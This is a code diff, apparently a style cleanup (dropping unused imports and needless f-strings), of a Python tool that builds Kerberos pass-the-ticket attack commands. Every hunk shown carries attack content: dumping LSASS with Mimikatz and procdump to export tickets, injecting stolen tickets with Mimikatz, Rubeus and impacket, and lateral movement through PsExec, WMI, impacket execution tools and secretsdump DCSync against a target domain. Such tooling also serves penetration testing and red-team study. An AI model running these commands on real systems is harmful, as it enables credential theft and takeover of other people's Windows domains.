@@ -19,17 +19,13 @@ Requirements:
 """
 
 import argparse
-import base64
 import json
-import struct
 import sys
 from datetime import datetime
 from pathlib import Path
-from typing import Any
 
 try:
     from rich.console import Console
-    from rich.table import Table
     from rich.panel import Panel
 except ImportError:
     print("[!] Missing dependencies. Install with: pip install rich")
@@ -46,7 +42,7 @@ def generate_extraction_commands(target: str, method: str = "all") -> dict:
             "commands": [
                 "privilege::debug",
                 "sekurlsa::tickets /export",
-                f"# Tickets exported to current directory as .kirbi files",
+                "# Tickets exported to current directory as .kirbi files",
                 "# Look for TGT tickets: *krbtgt*.kirbi",
                 "# Look for high-value TGS: *cifs*dc*.kirbi, *ldap*dc*.kirbi",
             ],
@@ -66,7 +62,7 @@ def generate_extraction_commands(target: str, method: str = "all") -> dict:
         "procdump": {
             "description": "Dump LSASS for offline extraction",
             "commands": [
-                f"procdump.exe -ma lsass.exe lsass.dmp",
+                "procdump.exe -ma lsass.exe lsass.dmp",
                 "# Then offline with Mimikatz:",
                 "sekurlsa::minidump lsass.dmp",
                 "sekurlsa::tickets /export",
@@ -81,23 +77,23 @@ def generate_extraction_commands(target: str, method: str = "all") -> dict:
 
 def generate_injection_commands(ticket_path: str, ticket_format: str = "kirbi") -> dict:
     """Generate commands for ticket injection."""
-    commands = {
+    return {
         "windows_mimikatz": [
             "# Purge existing tickets",
             "kerberos::purge",
-            f"# Inject ticket",
+            "# Inject ticket",
             f"kerberos::ptt {ticket_path}",
             "# Verify",
             "kerberos::list",
         ],
         "windows_rubeus": [
-            f"# Inject from file",
+            "# Inject from file",
             f".\\Rubeus.exe ptt /ticket:{ticket_path}",
             "# Create process with ticket (safer - doesn't modify current session)",
             f".\\Rubeus.exe createnetonly /program:C:\\Windows\\System32\\cmd.exe /ptt /ticket:{ticket_path}",
         ],
         "linux_impacket": [
-            f"# Convert if needed (kirbi to ccache)",
+            "# Convert if needed (kirbi to ccache)",
             f"impacket-ticketConverter {ticket_path} ticket.ccache",
             "# Set environment variable",
             "export KRB5CCNAME=ticket.ccache",
@@ -105,36 +101,34 @@ def generate_injection_commands(ticket_path: str, ticket_format: str = "kirbi") 
             "klist",
         ],
     }
-    return commands
 
 
 def generate_lateral_movement_commands(target: str, domain: str, username: str = "administrator") -> dict:
     """Generate lateral movement commands using injected ticket."""
-    commands = {
+    return {
         "windows": [
-            f"# Access file share",
+            "# Access file share",
             f"dir \\\\{target}\\c$",
-            f"# Remote command execution via PsExec",
+            "# Remote command execution via PsExec",
             f"PsExec.exe \\\\{target} cmd.exe",
-            f"# WMI remote execution",
+            "# WMI remote execution",
             f'wmic /node:"{target}" process call create "cmd.exe /c whoami > c:\\temp\\whoami.txt"',
-            f"# PowerShell remoting",
+            "# PowerShell remoting",
             f"Enter-PSSession -ComputerName {target}",
         ],
         "linux_impacket": [
-            f"# PsExec with Kerberos ticket",
+            "# PsExec with Kerberos ticket",
             f"impacket-psexec -k -no-pass {domain}/{username}@{target}",
-            f"# SMBExec",
+            "# SMBExec",
             f"impacket-smbexec -k -no-pass {domain}/{username}@{target}",
-            f"# WMIExec",
+            "# WMIExec",
             f"impacket-wmiexec -k -no-pass {domain}/{username}@{target}",
-            f"# SecretsDump (DCSync if targeting DC)",
+            "# SecretsDump (DCSync if targeting DC)",
             f"impacket-secretsdump -k -no-pass {domain}/{username}@{target}",
-            f"# SMB client for file access",
+            "# SMB client for file access",
             f"impacket-smbclient -k -no-pass {domain}/{username}@{target}",
         ],
     }
-    return commands
 
 
 def analyze_kirbi_ticket(ticket_path: str) -> dict | None:
@@ -182,7 +176,6 @@ def convert_ticket(input_path: str, output_path: str):
     """Convert between ticket formats (kirbi <-> ccache)."""
     try:
         from impacket.krb5.ccache import CCache
-        from impacket.krb5 import constants
 
         if input_path.endswith(".kirbi") and output_path.endswith(".ccache"):
             ccache = CCache.loadKirbiFile(input_path)
